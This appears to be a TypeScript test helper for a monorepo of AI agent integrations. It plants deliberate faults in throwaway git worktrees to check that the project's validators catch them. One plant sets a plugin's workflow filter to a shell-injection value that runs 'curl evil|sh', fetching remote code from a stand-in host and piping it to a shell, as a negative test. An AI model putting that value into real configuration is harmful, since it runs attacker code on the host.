import { AgentId } from '@zapbip/agents/definitions';
import { AGENT_INSTALLS } from '@zapbip/agents/install';
import { CONNECTOR_RUNTIMES, ConnectorClient } from '@zapbip/agents/connector';
import { AGENT_PLUGINS } from '@zapbip/agents/plugins';
import { afterAll, describe, expect, test } from 'vitest';
import {
  FULL_SUITES,
  IS_INSIDE_PROOF,
  WORKTREE_PROOF_TIMEOUT_MS,
  changedPathsOf,
  checkOutHead,
  createThrowawayWorktree,
  failuresOf,
  installDependencies,
  isOutside,
  LockfileMode,
  run,
} from './throwaway-worktree';

export const SUPPORTED_ROOT = 'libs/agents/supported';

export const connectorIds: string[] = Object.values(ConnectorClient);
export const pluginIds = Object.keys(AGENT_PLUGINS);
const installOnlyId = Object.values(AgentId).find((id) => !connectorIds.includes(id) && !pluginIds.includes(id)) as string;
export const removedIds = [...connectorIds.slice(0, -1), ...pluginIds, installOnlyId];

export function ownedPrefixesOf(input: { id: string }): string[] {
  const plugin = Object.entries(AGENT_PLUGINS).find(([pluginId]) => pluginId === input.id)?.[1];
  const pluginPrefixes = plugin ? [`${plugin.packageFolder}/`] : [];
  return [`${SUPPORTED_ROOT}/${input.id}/`, ...pluginPrefixes];
}

const reasonedConnectorId = Object.entries(CONNECTOR_RUNTIMES).find(([, runtime]) => runtime.strictMcpNullReason !== null)?.[0] as string;
export const installAgentId = Object.keys(AGENT_INSTALLS)[0] as string;
const pluginAgentId = pluginIds[0] as string;
const LEAK_FILE = 'apps/api/src/app.ts';
export const PLANTS = [
  {
    name: 'an id planted in a shared source file',
    file: LEAK_FILE,
    id: installAgentId,
    edit: (text: string) => `${text}\nconst planted = '${installAgentId}-ide';\n`,
  },
  {
    name: 'a connector with a null strict flag and no reason',
    file: `${SUPPORTED_ROOT}/${reasonedConnectorId}/connector.ts`,
    id: reasonedConnectorId,
    edit: (text: string) => text.replace(/strictMcpNullReason: StrictMcpNullReason\.\w+,/, 'strictMcpNullReason: null,'),
  },
  {
    name: 'an install section with a two-line product name',
    file: `${SUPPORTED_ROOT}/${installAgentId}/install.ts`,
    id: installAgentId,
    edit: (text: string) => text.replace(/\{ \.\.\.(\w+), render \}/, "{ ...$1, productName: 'First\\nSecond', render }"),
  },
  {
    name: 'a plugin whose workflow filter is an injection',
    file: `${SUPPORTED_ROOT}/${pluginAgentId}/plugin.ts`,
    id: pluginAgentId,
    edit: (text: string) => text.replace("filter: '", 'filter: \'x" ; curl evil|sh # '),
  },
];

export const UNREADABLE_FILE = 'README.md';

export function extraHeadingEdit(text: string): string {
  return text.replace(/return (\w+)\[input\.locale\]\(input\);/, 'return `${$1[input.locale](input)}\\n\\n## Extra`;');
}

export function useThrowawayWorktrees(): () => ReturnType<typeof createThrowawayWorktree> {
  const worktrees: { remove: () => void }[] = [];
  afterAll(() => worktrees.forEach((worktree) => worktree.remove()));
  return () => {
    const worktree = createThrowawayWorktree();
    worktrees.push(worktree);
    return worktree;
  };
}

export function defineScaffoldProof(input: { name: string; flags: string[] }): void {
  const newWorktree = useThrowawayWorktrees();
  describe.skipIf(IS_INSIDE_PROOF)('the agent lifecycle in a throwaway worktree', () => {
    test(
      `scaffolding ${input.name} changes only its folders and the generated set, and every suite stays green`,
      () => {
        const scaffoldId = `scaffold-probe-${Math.random().toString(36).slice(2, 8)}`;
        const worktree = newWorktree();
        expect(checkOutHead({ directory: worktree.directory }).status).toBe(0);
        const install = installDependencies({ directory: worktree.directory, lockfile: LockfileMode.Frozen });
        expect(install.status, install.output).toBe(0);
        const scaffold = run({ command: ['pnpm', 'agents:new', scaffoldId, ...input.flags], directory: worktree.directory });
        expect(scaffold.status, scaffold.output).toBe(0);
        const resolution = installDependencies({ directory: worktree.directory, lockfile: LockfileMode.Resolve });
        expect(resolution.status, resolution.output).toBe(0);
        const generation = run({ command: ['pnpm', 'agents:generate'], directory: worktree.directory });
        expect(generation.status, generation.output).toBe(0);
        const check = run({ command: ['pnpm', 'agents:check'], directory: worktree.directory });
        expect(check.status, check.output).toBe(0);
        const prefixes = [`${SUPPORTED_ROOT}/${scaffoldId}/`, `apps/${scaffoldId}-plugin/`];
        const outside = changedPathsOf({ directory: worktree.directory }).filter((path) => isOutside({ path, prefixes }));
        expect(outside).toEqual([]);
        expect(failuresOf({ suites: FULL_SUITES, directory: worktree.directory })).toEqual([]);
      },
      WORKTREE_PROOF_TIMEOUT_MS,
    );
  });
}
